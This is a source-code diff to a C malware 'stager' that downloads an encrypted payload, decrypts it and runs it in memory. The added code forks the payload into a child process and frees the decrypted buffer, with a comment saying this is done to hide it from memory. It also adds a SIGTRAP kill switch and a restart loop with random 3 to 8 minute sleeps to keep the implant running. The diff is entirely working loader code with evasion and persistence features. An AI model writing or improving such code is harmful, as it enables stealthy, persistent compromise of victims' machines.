@@ -49,6 +49,13 @@ static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                         const uint8_t *key, char **out_buf,
                                         size_t *out_size);
 
+static volatile int g_trap_requested = 0;
+
+static void sigtrap_handler(int signo) {
+  (void)signo;
+  g_trap_requested = 1;
+}
+
 void stager_main(long *sp);
 
 __asm__(".text\n"
@@ -80,6 +87,13 @@ void stager_main(long *sp) {
 
   derive_key_from_string(key_str, key);
 
+  // Setup signal handler for SIGTRAP
+  struct sigaction trap_sa;
+  memset(&trap_sa, 0, sizeof(trap_sa));
+  trap_sa.sa_handler = sigtrap_handler;
+  sigemptyset(&trap_sa.sa_mask);
+  sigaction(SIGTRAP, &trap_sa, NULL);
+
   char *payload = NULL;
 
   DEBUG_PRINT("Starting stager...\n");
@@ -90,15 +104,67 @@ void stager_main(long *sp) {
   DEBUG_PRINT("Downloaded %d bytes\n", (int)downloaded_size);
 
   if (downloaded_size > 0) {
-    char *final_payload = NULL;
-    size_t final_size = 0;
-    if (build_payload_from_encrypted(payload, downloaded_size, key,
-                                     &final_payload, &final_size) == 0) {
-      DEBUG_PRINT("Payload built successfully, size: %d\n", (int)final_size);
-      // Run it
-      elf_run(final_payload, argv, envp);
-    } else {
-      DEBUG_PRINT("Failed to build payload\n");
+    while (1) {
+      g_trap_requested = 0;
+
+      char *final_payload = NULL;
+      size_t final_size = 0;
+      if (build_payload_from_encrypted(payload, downloaded_size, key,
+                                       &final_payload, &final_size) == 0) {
+        DEBUG_PRINT("Payload built successfully, size: %d\n", (int)final_size);
+        // Run it
+        long pid = fork();
+        if (pid == 0) {
+          // Child process
+          elf_run(final_payload, argv, envp);
+          exit(0);
+        } else if (pid > 0) {
+          // Parent process
+          // Free the decrypted payload to hide it from memory
+          free(final_payload);
+
+          // Wait for child to exit
+          int status = 0;
+          while (1) {
+            long res = waitpid((int)pid, &status, WNOHANG);
+            if (res == pid) {
+              DEBUG_PRINT("Child exited with status %d\n", status);
+              break;
+            }
+
+            if (g_trap_requested) {
+              DEBUG_PRINT("Indicator offline trap received, killing child %d\n",
+                          (int)pid);
+              kill((int)pid, SIGKILL);
+              waitpid((int)pid, &status, 0);
+              break;
+            }
+
+            struct timespec req;
+            req.tv_sec = 1;
+            req.tv_nsec = 0;
+            nanosleep(&req, NULL);
+          }
+
+          // Sleep for a random time (3-8 minutes)
+          unsigned int sleep_s = 0;
+          getrandom(&sleep_s, sizeof(sleep_s), 0);
+          sleep_s = 180 + (sleep_s % 300);
+
+          DEBUG_PRINT("Sleeping %d seconds before restart\n", sleep_s);
+          struct timespec req;
+          req.tv_sec = sleep_s;
+          req.tv_nsec = 0;
+          nanosleep(&req, NULL);
+        } else {
+          DEBUG_PRINT("Fork failed\n");
+          free(final_payload);
+          break;
+        }
+      } else {
+        DEBUG_PRINT("Failed to build payload\n");
+        break;
+      }
     }
   } else {
     DEBUG_PRINT("Download failed\n");
